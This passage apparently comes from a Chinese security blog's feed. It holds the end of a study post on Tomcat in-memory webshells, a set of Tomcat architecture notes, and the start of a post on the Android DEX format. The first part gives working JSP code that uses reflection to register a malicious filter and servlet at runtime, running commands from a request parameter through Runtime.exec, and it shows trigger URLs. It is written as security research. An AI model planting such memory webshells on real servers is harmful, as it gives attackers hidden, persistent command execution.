class="comment">//filter名称</span></span><br><span class="line">String name = <span class="string">&quot;MyFilter&quot;</span>;</span><br><span class="line">FilterDef filterDef = <span class="keyword">new</span> FilterDef();</span><br><span class="line">filterDef.setFilter(filter);</span><br><span class="line">filterDef.setFilterName(name);</span><br><span class="line">filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">standardContext.addFilterDef(filterDef);</span><br></pre></td></tr></table></figure><h4 id="创建filterMap"><a href="#创建filterMap" class="headerlink" title="创建filterMap"></a>创建filterMap</h4><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">FilterMap filterMap = <span class="keyword">new</span> FilterMap();</span><br><span class="line">filterMap.addURLPattern(<span class="string">&quot;/filter&quot;</span>);</span><br><span class="line">filterMap.setFilterName(name);</span><br><span class="line">filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">standardContext.addFilterMapBefore(filterMap);</span><br></pre></td></tr></table></figure><h4 id="封装filterConfig及filterDef到filterConfigs"><a href="#封装filterConfig及filterDef到filterConfigs" class="headerlink" title="封装filterConfig及filterDef到filterConfigs"></a>封装filterConfig及filterDef到filterConfigs</h4><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Field Configs = standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">Configs.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Map filterConfigs = (Map) Configs.get(standardContext);</span><br><span class="line">    </span><br><span class="line">Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class="line">filterConfigs.put(name, filterConfig);</span><br></pre></td></tr></table></figure><p>先访问<a href="http://localhost:8080/maveninject_demo_war_exploded/filter.jsp">http://localhost:8080/maveninject_demo_war_exploded/filter.jsp</a> 之后访问<a href="http://localhost:8080/maveninject_demo_war_exploded/filter?filter=calc">http://localhost:8080/maveninject_demo_war_exploded/filter?filter=calc</a></p><p><img src="https://s2.loli.net/2022/11/18/9VGRiy3FLQ4CfNA.png" alt="image-20221118134231375"></p><h3 id="Servlet型"><a href="#Servlet型" class="headerlink" title="Servlet型"></a>Servlet型</h3><p>servlet在web请求流程中是最后一个组件，所以分析起来也是最复杂的。在调用 Servlet 的时候也会看到之前的 Listener 与 Filter 的流程。</p><p>照常在web.xml中配置Servlet</p><p><img src="https://s2.loli.net/2022/11/18/NLPnefqHwR8u2vd.png" alt="image-20221118135416767"></p><p>根据Servlet的生命周期，当浏览器访问Servlet的时候，Servlet 会调用<code>service()</code>方法处理请求，将恶意代码写入service()即可</p><p><img src="https://s2.loli.net/2022/11/18/VcAhUPfegbnJdm1.png" alt="image-20221118135440916"></p><p>触发：<a href="http://localhost:8080/maveninject_demo_war_exploded/hello?cmd=calc">http://localhost:8080/maveninject_demo_war_exploded/hello?cmd=calc</a></p><h4 id="调试分析-2"><a href="#调试分析-2" class="headerlink" title="调试分析"></a>调试分析</h4><p>把断点打在init()上，开始初步调试。</p><p>tomcat在实例化此servlet后，会立即调用init方法初始化servlet </p><p>org.apache.catalina.core.StandardWrapper#initServlet</p><p><img src="https://s2.loli.net/2022/11/28/znFsAgSDIkQv35d.png" alt="image-20221128131813637"></p><p>容器收到请求后会调用servlet的service方法来处理请求，从调用栈来看，初始化会经过CoyoteAdapter和Http11Processor这两个类，<code>HTTP11Processor</code>类是一个网络请求的类，它的作用是处理数据包，而它的<code>service()</code>方法主要是在处理 HTTP 包的请求头，主要做了赋值的工作，后续会通过<code>ByteBuff</code>进行数据解析</p><p>这个类的service是从CoyoteAdapter获取来的，CoyoteAdapter是 Processor 和 Valve 之间的适配器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">this.getAdapter().service(this.request, this.response);</span><br></pre></td></tr></table></figure><p> <img src="https://s2.loli.net/2022/11/28/SN2xvt5fonbs8p3.png" alt="image-20221128133337912"></p><p>在CoyoteAdapter中有一个关键代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">connector.getService().getContainer().getPipeline().getFirst().invoke(</span><br><span class="line">                        request, response);</span><br></pre></td></tr></table></figure><p>getService()获取StandardService对象，getContainer()返回Service里的容器Engine属性，也就是StandardEngine对象，getPipeline()返回StandardEngine里的Pipeline属性，也就是<code>StandardPipeline</code>对象，最后获取第一行或basic数据，最后invoke进行host相关判断。后面和Filter类似，进行多个invoke的调用。</p><p>这次在ContextConfig#webConfig()下断点</p><p>在ContextConfig#configureContext(WebXml webxml)中，会对web.xml中的数据进行读取。</p><p><img src="https://s2.loli.net/2022/11/18/DoBXi7OrnspH49l.png" alt="image-20221118165615856"></p><p>后续对 Filter，Listener 等信息进行处理，跳过</p><p><img src="https://s2.loli.net/2022/11/25/kOF5uH8MfcU9CoG.png" alt="image-20221125140014115"></p><p>到configureContext(webXml); 跟进，webxml.getServlets()开始对Servlet进行读取</p><p><img src="https://s2.loli.net/2022/11/28/CZRv1G43YyeVXja.png" alt="image-20221128145119346"></p><p>createWrapper()实际是在创建StandardWrpper,后面代码对它进行加载和处理。</p><p><img src="https://s2.loli.net/2022/11/28/ImSZVqrsx9JAjKW.png" alt="image-20221128145342151"></p><p>继续向下看，context.addChild(wrapper);将wrapper添加到了StandardContext中</p><p><img src="https://s2.loli.net/2022/11/28/at9doSDQN5O1hiW.png" alt="image-20221128145427719"></p><p>跟进<code>addChild()</code>方法 , 进入StandardContext类，它首先进行判断这个 Servlet 是否是 JSP 的 Servlet，然后进入父类的addChild(child)</p><p><img src="https://s2.loli.net/2022/11/28/E6MwzASLV2DuTfI.png" alt="image-20221128150258492"></p><p>父类<code>ContainerBase</code>类的<code>addChild()</code>方法判断了是否开启全局安全这个配置。</p><p><img src="https://s2.loli.net/2022/11/28/BmuWVcSrGe4ZDXQ.png" alt="image-20221128150524860"></p><p>跟进到<code>addChildInternal()</code>方法，这里的 child.start() 开启了Servlet的线程。</p><p><img src="https://s2.loli.net/2022/11/28/Am3XRt9a1sKUuyM.png" alt="image-20221128150659470"></p><p>跟进后续，进入到LifecycleBase类的start()方法，进行了一些log判断，进入init()后，执行startInternal() </p><p><img src="https://s2.loli.net/2022/11/28/m6d7nk3NKRSX5DT.png" alt="image-20221128151002080"></p><p>跟进startInternal() 进入了 StandardContext#startInternal，调用了fireLifecycleEvent()解析web.xml</p><p>wrapper封装完毕后，调用<code>addServletMappingDecoded()</code>方法添加映射关系，将url 路径和 servlet 类做映射。</p><p><img src="https://s2.loli.net/2022/11/28/1yfSxQkEM42i3mq.png" alt="image-20221128152621197"></p><p>后面又对<code>loadOnStartUp</code>这个属性进行了判断</p><p><img src="https://s2.loli.net/2022/11/28/MkJQI85PwoY4nmD.png" alt="image-20221128154055949"></p><p><strong>这个参数</strong>在 servlet 的配置当中，<code>&lt;load-on-startup&gt;1&lt;/load-on-startup&gt;</code>的含义是： 标记容器是否在启动的时候就加载这个 servlet。当值为 0 或者大于 0 时，表示容器在应用启动时就加载这个 servlet； 当是一个负数时或者没有指定时，则指示容器在该 servlet 被选择时才加载。 正数的值越小，启动该 servlet 的优先级越高。这是tomcat servelt的懒加载机制。而这个属性默认值为-1，所以在加载时要修改这一项优先级。</p><h4 id="步骤总结"><a href="#步骤总结" class="headerlink" title="步骤总结"></a>步骤总结</h4><ol><li>通过<code>context.createWapper()</code>创建 Wapper 对象；</li><li>设置 Servlet 的<code>LoadOnStartUp</code>的值；</li><li>设置 Servlet 的 Name ；</li><li>设置 Servlet 对应的 Class ；</li><li>将 Servlet 添加到 context 的 children 中；</li><li>将 url 路径和 servlet 类做映射。</li></ol><h4 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h4><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    Field reqF = request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Request req = (Request) reqF.get(request);</span><br><span class="line">    StandardContext standardContext = (StandardContext) req.getContext();</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Shell_Servlet</span> <span class="keyword">implements</span> <span class="title">Servlet</span> </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> ServletConfig <span class="title">getServletConfig</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">service</span><span class="params">(ServletRequest req, ServletResponse res)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">            String cmd = req.getParameter(<span class="string">&quot;servlet&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd !=<span class="keyword">null</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    Runtime.getRuntime().exec(cmd);</span><br><span class="line">                &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;<span class="keyword">catch</span> (NullPointerException n)&#123;</span><br><span class="line">                    n.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">getServletInfo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    Shell_Servlet shell_servlet = <span class="keyword">new</span> Shell_Servlet();</span><br><span class="line">    String name = shell_servlet.getClass().getSimpleName();</span><br><span class="line"></span><br><span class="line">    Wrapper wrapper = standardContext.createWrapper();</span><br><span class="line">    wrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">    wrapper.setName(name);</span><br><span class="line">    wrapper.setServlet(shell_servlet);</span><br><span class="line">    wrapper.setServletClass(shell_servlet.getClass().getName());</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    standardContext.addChild(wrapper);</span><br><span class="line">    standardContext.addServletMappingDecoded(<span class="string">&quot;/servletshell&quot;</span>,name);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>访问jsp后执行 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/maveninject_demo_war_exploded/servletshell?servlet=calc</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/11/28/q6vY9E82oIjpmhM.png" alt="image-20221128154938777"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://mp.weixin.qq.com/s/BlhKbSROyodRSJpLjtKnCQ">https://mp.weixin.qq.com/s/BlhKbSROyodRSJpLjtKnCQ</a></p><p><a href="http://wjlshare.com/archives/1529">http://wjlshare.com/archives/1529</a></p><p><a href="https://xz.aliyun.com/t/10888">https://xz.aliyun.com/t/10888</a></p><p><a href="https://xz.aliyun.com/t/11084">https://xz.aliyun.com/t/11084</a> </p><p><a href="https://www.freebuf.com/articles/web/344003.html">https://www.freebuf.com/articles/web/344003.html</a></p><p><a href="https://mp.weixin.qq.com/s/3nKvZcZ0n8maMsaGFt8aYQ">https://mp.weixin.qq.com/s/3nKvZcZ0n8maMsaGFt8aYQ</a></p><p><a href="https://goodapple.top/archives/1355">https://goodapple.top/archives/1355</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat架构</title>
      <link href="2024/03/10/Tomcat%E6%9E%B6%E6%9E%84/"/>
      <url>2024/03/10/Tomcat%E6%9E%B6%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>为了对内存马进行学习研究，本篇为tomcat架构的学习笔记</p><h2 id="Tomcat简介"><a href="#Tomcat简介" class="headerlink" title="Tomcat简介"></a>Tomcat简介</h2><p>Tomcat = Web服务器 + Servlet容器</p><p><img src="https://s2.loli.net/2022/11/11/Kh8IZG9bq7mjP4V.png" alt="img"></p><p>Tomcat能够通过Connector组件接收并解析HTTP请求，然后将一个<code>ServletRequest</code>对象发送给Container处理。容器处理完之后会将响应封装成<code>ServletRespone</code>返回给Connector，然后Connector再将<code>ServletRespone</code>解析为HTTP响应文本格式发送给客户端，至此Tomcat就完成了一次网络通信。</p><h2 id="Tomcat架构"><a href="#Tomcat架构" class="headerlink" title="Tomcat架构"></a>Tomcat架构</h2><p><img src="https://s2.loli.net/2022/11/11/coz4FANmjgpiQvy.png" alt="img"></p><p>Tomcat Server分为三大组件：Service、Connector、Container</p><h3 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h3><p>其中一个Tomcat Server可以包含多个Service，比如Tomcat默认的Service服务Catalina。每一个Service都是独立的，他们共享一个JVM以及系统类库，并且一个Service负责维护多个Connector和一个Container。</p><h3 id="Connector"><a href="#Connector" class="headerlink" title="Connector"></a>Connector</h3><p>Connector用于连接Service和Container，解析客户端的请求并转发到Container，以及转发来自Container的响应。每一种不同的Connector都可以处理不同的请求协议，包括HTTP/1.1、HTTP/2、AJP等等。</p><h3 id="Container"><a href="#Container" class="headerlink" title="Container"></a>Container</h3><p>Tomcat的Container包含四种子容器：<code>Engine</code>、<code>Host</code>、<code>Context</code>和<code>Wrapper</code></p><p>其中，一个Container对应一个Engine，一个Engine可以包含多个Host，一个Host可以包含多个Context，Context又包含多个Wrapper，各子容器的功能如下</p><h4 id="Engine"><a href="#Engine" class="headerlink" title="Engine"></a>Engine</h4><p>可以看成是容器对外提供功能的入口，每个Engine是Host的集合，用于管理各个Host。</p><h4 id="Host"><a href="#Host" class="headerlink" title="Host"></a>Host</h4><p>可以看成一个<code>虚拟主机</code>，一个Tomcat可以支持多个虚拟主机。</p><h4 id="Context"><a href="#Context" class="headerlink" title="Context"></a>Context</h4><p>又叫做上下文容器，我们可以将其看成一个Web应用，每个Host里面可以运行多个Web应用。同一个Host里面不同的Context，其contextPath必须不同，默认Context的contextPath为空格(“”)或斜杠(/)。</p><h4 id="Wrapper"><a href="#Wrapper" class="headerlink" title="Wrapper"></a>Wrapper</h4><p>是对Servlet的抽象和包装，每个Context可以有多个Wrapper，用于支持不同的Servlet。每个Wrapper实例表示一个具体的Servlet定义，Wrapper主要负责管理 Servlet ，包括了 Servlet 的装载、初始化、执行以及资源回收。</p><p><strong>Container中的解析过程：</strong></p><p><img src="https://s2.loli.net/2022/11/11/xsMDytWPeO6JigI.png" alt="img"></p><p>以上的映射信息通过通过Mapper组件来关联。Mapper组件保存了Web应用的配置信息，容器组件与访问路径的映射关系等。</p><h2 id="JavaWeb"><a href="#JavaWeb" class="headerlink" title="JavaWeb"></a>JavaWeb</h2><p>三大组件：Servlet、Filter、Listener</p><p>三者的加载顺序：Listener-&gt;Filter-&gt;Servlet</p><h3 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h3><p>Servlet是用来处理客户端请求的动态资源，当Tomcat接收到来自客户端的请求时，会将其解析成<code>RequestServlet</code>对象并发送到对应的Servlet上进行处理。</p><p>Servlet生命周期：</p><ul><li>加载：当Tomcat第一次访问Servlet的时候，Tomcat会负责创建Servlet的实例</li><li>初始化：当Servlet被实例化后，Tomcat会调用<code>init()</code>方法初始化这个对象</li><li>处理服务：当浏览器访问Servlet的时候，Servlet 会调用<code>service()</code>方法处理请求</li><li>销毁：当Tomcat关闭时或者检测到Servlet要从Tomcat删除的时候会自动调用<code>destroy()</code>方法，让该实例释放掉所占的资源。一个Servlet如果长时间不被使用的话，也会被Tomcat自动销毁</li><li>卸载：当Servlet调用完<code>destroy()</code>方法后，等待垃圾回收。如果有需要再次使用这个Servlet，会重新调用<code>init()</code>方法进行初始化操作</li></ul><p>只要访问Servlet，<code>service()</code>就会被调用。<code>init()</code>只有第一次访问Servlet的时候才会被调用。 <code>destroy()</code>只有在Tomcat关闭的时候才会被调用。因此我们主要的业务逻辑代码是写在<code>service()</code>函数中的。</p><h4 id="ServletConfig"><a href="#ServletConfig" class="headerlink" title="ServletConfig"></a>ServletConfig</h4><p>当Servlet容器初始化一个Servlet时，会为这个Servlet创建一个ServletConfig对象，并将 ServletConfig 对象作为参数传递给Servlet。ServletConfig对象封装了Servlet的一些独有参数信息，因此一个Servlet只能对应一个ServletConfig。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">package Servlet;</span><br><span class="line"> </span><br><span class="line">import javax.servlet.ServletConfig;</span><br><span class="line">import javax.servlet.ServletException;</span><br><span class="line">import javax.servlet.annotation.WebServlet;</span><br><span class="line">import javax.servlet.http.HttpServlet;</span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletResponse;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.PrintWriter;</span><br><span class="line"> </span><br><span class="line">@WebServlet(&quot;&#x2F;config&quot;)</span><br><span class="line">public class Config_Servlet extends HttpServlet &#123;</span><br><span class="line"> </span><br><span class="line">    @Override</span><br><span class="line">    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class="line">        &#x2F;&#x2F;设置响应编码</span><br><span class="line">        resp.setContentType(&quot;text&#x2F;html; charset&#x3D;UTF-8&quot;);</span><br><span class="line">        &#x2F;&#x2F;获取ServletConfig</span><br><span class="line">        ServletConfig servletConfig &#x3D; getServletConfig();</span><br><span class="line">        &#x2F;&#x2F;获取Servlet名称</span><br><span class="line">        String name &#x3D; servletConfig.getServletName();</span><br><span class="line">        PrintWriter writer &#x3D; resp.getWriter();</span><br><span class="line">        writer.write(&quot;Servlet名称为：&quot;+name);</span><br><span class="line">        writer.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ServletContext"><a href="#ServletContext" class="headerlink" title="ServletContext"></a>ServletContext</h4><p>Servlet 容器启动时，会为每个 Web 应用（webapps 下的每个目录都是一个 Web 应用）创建一个唯一的 ServletContext 对象，该对象一般被称为“Servlet 上下文”。</p><p>由于一个Web应用可以包含多个Servlet，因此ServletContext可以看作是一个Web应用中各Servlet的共享资源。不同 Servlet 之间可以通过ServletContext对象实现数据通讯，因此ServletContext对象也被称为Context域对象。</p><p>ServletContext 对象的生命周期从 Servlet 容器启动时开始，到容器关闭或应用被卸载时结束。</p><p>通过ServletContext可以获取Web应用中一些共享的资源。</p><h3 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h3><p>Filter用于拦截用户请求以及服务端的响应，能够在拦截之后对请求和响应做出相应的修改。Filter不是Servlet，不能直接访问，它能够对于Web应用中的资源（Servlet、JSP、静态页面等）做出拦截，从而实现一些相应的功能。</p><p>filter生命周期：</p><ul><li>初始化阶段：init(FilterConfig)，初始化方法，只会在web应用程序启动时调用一次。</li><li>拦截和过滤阶段：doFilter(ServletRequest, ServletResponse, FilterChain)，完成实际的过滤操作。当客户请求访问与过滤器关联的URL的时候，Servlet过滤器将先执行doFilter方法。FilterChain参数用于访问后续过滤器</li><li>销毁阶段：destory()，销毁Filter，只会在当web应用移除或服务器停止时才调用一次来卸载Filter对象</li></ul><h4 id="FilterChain"><a href="#FilterChain" class="headerlink" title="FilterChain"></a>FilterChain</h4><p>我们知道，一个Servlet可以注册多个Filter，Web容器会将注册的多个Filter组合成一个“Filter链”，并按照一定的顺序依次执行各Filter的doFilter()方法。</p><p><img src="https://s2.loli.net/2022/11/11/kxwGK9vVcoAbzeN.png" alt="img"></p><p>FilterChain就是这样一个接口，其doFIiter()方法用于将本Filter处理完的Servlet资源交给下一个Filter处理。</p><h4 id="Filter执行顺序"><a href="#Filter执行顺序" class="headerlink" title="Filter执行顺序"></a>Filter执行顺序</h4><ul><li>基于注解配置：按照类名的字符串比较规则比较，值小的先执行</li><li>使用web.xml配置：根据对应的Mapping的顺序组织，谁定义在上边谁就在前</li></ul><h4 id="FilterConfig"><a href="#FilterConfig" class="headerlink" title="FilterConfig"></a>FilterConfig</h4><p>和Servlet类似，由于Filter也有可能访问Servlet，所以Servlet 规范将代表 ServletContext 对象和 Filter 的配置参数信息都封装到一个称为 FilterConfig 的对象中。</p><p>FilterConfig接口则用于定义FilterConfig对象应该对外提供的方法，以便在 Filter的doFilter()方法中可以调用这些方法来获取 ServletContext 对象，以及获取在 web.xml 文件中的一些初始化参数。</p><h3 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h3><p>Listener是一个实现了特定接口的Java程序，用于监听一个方法或者属性，当被监听的方法被调用或者属性改变时，就会自动执行某个方法。</p><p>几个概念：</p><ul><li>事件：某个方法被调用，或者属性的改变</li><li>事件源：被监听的对象（如ServletContext、requset、方法等）</li><li>监听器：用于监听事件源，当发生事件时会触发监听器</li></ul><p>监听器一共有8种：</p><table><thead><tr><th align="left">事件源</th><th align="left">监听器</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">ServletContext</td><td align="left">ServletContextListener</td><td align="left">用于监听 ServletContext 对象的创建与销毁过程</td></tr><tr><td align="left">HttpSession</td><td align="left">HttpSessionListener</td><td align="left">用于监听 HttpSession 对象的创建和销毁过程</td></tr><tr><td align="left">ServletRequest</td><td align="left">ServletRequestListener</td><td align="left">用于监听 ServletRequest 对象的创建和销毁过程</td></tr><tr><td align="left">ServletContext</td><td align="left">ServletContextAttributeListener</td><td align="left">用于监听 ServletContext 对象的属性新增、移除和替换</td></tr><tr><td align="left">HttpSession</td><td align="left">HttpSessionAttributeListener</td><td align="left">用于监听 HttpSession 对象的属性新增、移除和替换</td></tr><tr><td align="left">ServletRequest</td><td align="left">ServletRequestAttributeListener</td><td align="left">用于监听 HttpServletRequest 对象的属性新增、移除和替换</td></tr><tr><td align="left">HttpSession</td><td align="left">HttpSessionBindingListener</td><td align="left">用于监听 JavaBean 对象绑定到 HttpSession 对象和从 HttpSession 对象解绑的事件</td></tr><tr><td align="left">HttpSession</td><td align="left">HttpSessionActivationListener</td><td align="left">用于监听 HttpSession 中对象活化和钝化的过程</td></tr></tbody></table><p>按照监听的对象不同可以划分为三类</p><ul><li>ServletContextListener</li><li>HttpSessionListener</li><li>ServletRequestListener</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一文搞懂DEX文件结构</title>
      <link href="2023/11/28/%E4%B8%80%E6%96%87%E6%90%9E%E6%87%82DEX%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/"/>
      <url>2023/11/28/%E4%B8%80%E6%96%87%E6%90%9E%E6%87%82DEX%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="什么是DEX文件"><a href="#什么是DEX文件" class="headerlink" title="什么是DEX文件"></a>什么是DEX文件</h2><p>DEX文件就是Android Dalvik虚拟机运行的程序， Dalvik 虚拟机会对JAVA编译生成的.class文件进行<code>翻译、重构、解释、压缩</code>等处理，这个过程由<code>SDK</code>的<code>dx</code> 工具进行，完成之后就是dex文件。</p><p><code>dex的生成</code>如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac Hello</span><br><span class="line">dx --dex --output&#x3D;Hello.dex Hello.class</span><br></pre></td></tr></table></figure><h2 id="为什么使用DEX"><a href="#为什么使用DEX" class="headerlink" title="为什么使用DEX"></a>为什么使用DEX</h2><p>class文件的特点：</p><ul><li>class文件中包含各种数据如常量池、field等，而一个应用中有成百乃至更多的类，使用字节码文件存储类信息，内存占用过大，不适合移动端；</li><li>class文件是堆栈的加栈模式，加载速度慢；</li><li>文件IO操作多，类查找慢；因为每个class文件中只存储了一个Java源文件信息</li></ul><p>这些特征表明class文件不适合移动设备的加载使用，所以dex文件是对众多class文件做出了整合及优化，空间占用小，基于寄存器易加载。</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20211125105742582.png" alt="image-20211125105742582"></p><h2 id="dex文件的具体格式"><a href="#dex文件的具体格式" class="headerlink" title="dex文件的具体格式"></a>dex文件的具体格式</h2><p>就像 MP3，MP4，JPG，PNG 文件一样，Dex 文件也有它自己的格式，只有遵守了这些格式，才能被 Android 运行时环境正确识别。</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20211125110254312.png" 